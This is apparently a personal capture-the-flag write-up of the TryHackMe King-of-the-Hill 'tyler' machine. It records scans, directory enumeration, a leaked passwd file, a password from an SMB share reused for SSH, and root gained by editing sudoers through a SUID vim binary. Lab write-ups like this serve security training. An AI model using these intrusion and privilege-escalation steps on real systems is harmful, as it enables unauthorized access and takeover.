
THM-KOTH: tyler
============================

> labruhtooryboi | December 7, 2020


# 10.10.145.215
# tyler.thm


					# reconnisance

'''
Open 10.10.145.215:22
Open 10.10.145.215:80
Open 10.10.145.215:139
Open 10.10.145.215:445
Open 10.10.145.215:3306
Open 10.10.145.215:5000
Open 10.10.145.215:8080
Open 10.10.145.215:9999
'''

'''
Nmap scan report for 10.10.145.215
Host is up (0.21s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 46:6c:5a:31:5f:c1:1f:f3:65:e7:64:f2:c5:f5:59:d8 (RSA)
|   256 5d:a5:8a:af:1e:21:48:7a:04:22:3e:4a:f5:e4:5b:02 (ECDSA)
|_  256 6a:44:1c:e1:15:c9:5e:94:da:06:8d:db:d2:bc:66:54 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
5000/tcp open  http        Werkzeug httpd 1.0.0 (Python 3.6.8)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Werkzeug/1.0.0 Python/3.6.8
|_http-title: Tyler's file upload
6555/tcp open  unknown
8080/tcp open  http        nginx 1.16.1
|_http-favicon: Unknown favicon MD5: B8211E9B75068FB852BFB155D9A1A2EE
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
| http-title: LibreNMS
|_Requested resource was http://10.10.145.215:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 26 Mar 2020 11:36:37 GMT
|     Date: Mon, 07 Dec 2020 19:00:57 GMT
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 26 Mar 2020 11:36:37 GMT
|_    Date: Mon, 07 Dec 2020 19:00:56 GMT
1 service unrecognized despite returning data.
'''




					# enumeration


(public smb)
'''
flag.txt
alert.txt

Let's keep things interesting... X8JEETQmf3hkS65f
'''



(http:80)
'''
gobuster dir -u http://10.10.145.215/ -w /usr/share/wordlists/dirb/big.txt -o gob1.txt
'''

'''
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/betatest (Status: 301)
/cgi-bin/ (Status: 403)
/upload (Status: 301)
'''


(fuzz checkuser.php)
'''
tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash
tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash

mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin

narrator:x:1002:1002::/home/narrator:/bin/bash
narrator:x:1002:1002::/home/narrator:/bin/bash

root:x:0:0:root:/root:/bin/bash
operator:x:11:0:operator:/root:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
'''


(confirm w/ checkuser.php)
'''
narrator:x:1002:1002::/home/narrator:/bin/bash narrator:x:1002:1002::/home/narrator:/bin/bash

tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash


root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin
'''


					# exploitation

'''
narrator:X8JEETQmf3hkS65f
'''



					# privelage escalation


(linpeas)					
'''
-rwsr-sr-x. 1 root root     2.3M Aug  8  2019 /usr/bin/vim
'''

(vim /etc/sudoers)
'''
narrator ALL=(ALL)       ALL
'''




					# interesting things

>flags
'''
smbclient \\\\tyler.thm\\public

2308b0cccea3f2a187a89a9f3155a3a4
'''

'''
/home/narrator/user.txt

(need to record)
'''


>users
'''
root
narrator
tdurden
'''


>passwds
'''
X8JEETQmf3hkS65f
'''


>files and dirs
'''
http://10.10.145.215/betatest/
/usr/bin/vim
'''

'''
smbclient \\\\tyler.thm\\public
flag.txt
alert.txt
'''



>root stuff 
'''
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
tdurden:x:1000:1000:Tyler Durden:/home/tdurden:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
narrator:x:1002:1002::/home/narrator:/bin/bash
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
nginx:x:997:994:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
librenms:x:996:993::/opt/librenms:/bin/bas
'''

'''
'''
